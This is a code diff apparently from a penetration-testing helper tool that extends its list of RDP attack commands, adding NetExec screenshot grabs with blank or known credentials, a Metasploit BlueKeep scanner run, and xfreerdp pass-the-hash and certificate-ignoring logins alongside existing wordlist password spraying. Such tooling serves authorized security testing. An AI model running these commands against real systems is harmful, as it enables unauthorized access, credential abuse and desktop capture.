@@ -5028,13 +5028,18 @@ _STEP_COMMANDS = {
         1: [
             "nxc rdp <RHOST>",
             "nmap -p3389 --script rdp-ntlm-info,rdp-vuln-ms12-020 <RHOST>",
+            "nxc rdp <RHOST> -u '' -p '' --nla-screenshot   # capture login screen when NLA is off",
+            "msfconsole -q -x 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <RHOST>; run; exit'   # BlueKeep",
         ],
         2: [
             "nxc rdp <RHOST> -u /usr/share/seclists/Usernames/Names/names.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success",
             "nxc rdp <RHOST> -u <USER> -H <NTHASH>",
+            "xfreerdp /v:<RHOST> /u:<USER> /pth:<NTHASH> /cert:ignore +clipboard   # Restricted Admin PtH session",
+            "nxc rdp <RHOST> -u <USER> -p <PASS> --screenshot   # grab the desktop",
         ],
         3: [
-            "xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> +clipboard /dynamic-resolution",
+            "xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> /cert:ignore +clipboard /dynamic-resolution",
+            "xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> /d:<DOMAIN> /cert:ignore +clipboard /dynamic-resolution",
         ],
     },
     "vnc": {
